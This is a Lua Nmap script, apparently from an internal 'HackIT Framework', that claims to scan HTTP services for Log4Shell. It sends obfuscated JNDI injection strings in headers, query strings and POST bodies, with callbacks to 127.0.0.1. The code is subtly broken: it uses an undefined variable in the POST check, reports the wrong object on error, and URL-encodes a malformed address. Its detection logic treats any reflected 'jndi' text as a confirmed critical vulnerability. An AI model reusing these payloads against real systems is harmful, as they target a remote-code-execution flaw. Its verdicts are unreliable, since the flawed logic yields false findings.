local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Log4Shell (CVE-2021-44228) via JNDI injection in headers, parameters, and body with multiple callback patterns.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""
    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local jndi_payloads = {
      "${jndi:ldap://127.0.0.1:9999/test}",
      "${jndi:rmi://127.0.0.1:9999/test}",
      "${jndi:ldap://127.0.0.1/cb}",
      "${${lower:j}ndi:${lower:l}dap://127.0.0.1:9999/test}",
      "${jndi:ldap://127.0.0.1:1389/a}",
      "${jndi:dns://127.0.0.1/test}",
      "${${env:FOO:-j}ndi:${env:BAR:-l}dap://127.0.0.1:9999/test}",
    }

    local vectors = {
      {path = "/", header = "User-Agent", value = "${jndi:ldap://127.0.0.1:9999/ua}"},
      {path = "/", header = "X-Forwarded-For", value = "${jndi:ldap://127.0.0.1:9999/xff}"},
      {path = "/", header = "Referer", value = "${jndi:ldap://127.0.0.1:9999/ref}"},
      {path = "/", header = "X-Api-Version", value = "${jndi:ldap://127.0.0.1:9999/api}"},
      {path = "/", header = "Cookie", value = "x=${jndi:ldap://127.0.0.1:9999/cookie}"},
      {path = "/", header = "Authorization", value = "Basic ${jndi:ldap://127.0.0.1:9999/auth}"},
      {path = "/?x=${jndi:ldap://127.0.0.1:9999/param}", header = "", value = ""},
      {path = "/?y=${jndi:rmi://127.0.0.1:9999/param2}", header = "", value = ""},
    }

    for _, vec in ipairs(vectors) do
      local headers = {}
      if vec.header ~= "" then
        headers[vec.header] = vec.value
      end
      local req = http.get(host, port, vec.path, {header = headers})
      if req and req.status then
        local body = req.body or ""
        local body_lower = lower(body)
        for _, cb in ipairs(jndi_payloads) do
          local escaped = lower(cb):gsub("%$", "%%$"):gsub("%{", "%%{"):gsub("%}", "%%}"):gsub("%.", "%%."):gsub("%:", "%%:")
          if match(body_lower, escaped) or match(body_lower, "jndi") then
            insert(findings, {vector = ("%s header: %s"):format(vec.header ~= "" and vec.header or "query param", cb), path = vec.path, status = req.status})
            break
          end
        end
        local headers_out = req.headers or {}
        for hname, hval in pairs(headers_out) do
          local hstr = type(hval) == "table" and concat(hval, " ") or tostring(hval)
          if lower(hstr):match("jndi") or match(hstr, "%$%{jndi") then
            insert(findings, {vector = ("response header %s: %s"):format(hname, sub(hstr, 1, 80)), path = vec.path, status = req.status})
            break
          end
        end
      end
    end

    local post_probes = {
      {path = "/api/log", data = "log=%24%7B%6A%6E%64%69%3A%6C%64%61%70%3A%2F%2F31%37%2E%30%2E%30%2E%31%3A%39%39%39%39%2F%74%65%73%74%7D", ct = "application/x-www-form-urlencoded"},
      {path = "/graphql", data = "{\"query\":\"${jndi:ldap://127.0.0.1:9999/gql}\"}", ct = "application/json"},
    }

    for _, pp in ipairs(post_probes) do
      local req = http.post(host, port, pp.path, {
        header = {["Content-Type"] = pp.ct},
        data = pp.data
      })
      if req and req.body then
        local body = req.lower(body)
        if match(body, "jndi") then
          insert(findings, {vector = ("POST %s"):format(pp.path), path = pp.path, status = req.status})
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2021-44228, CVE-2021-45046, CVE-2021-45105"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.detail = ("Log4Shell - JNDI injection reflected via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = f.vector
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2021-44228"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.detail = "No Log4Shell detected via reflected JNDI patterns"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2021-44228"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
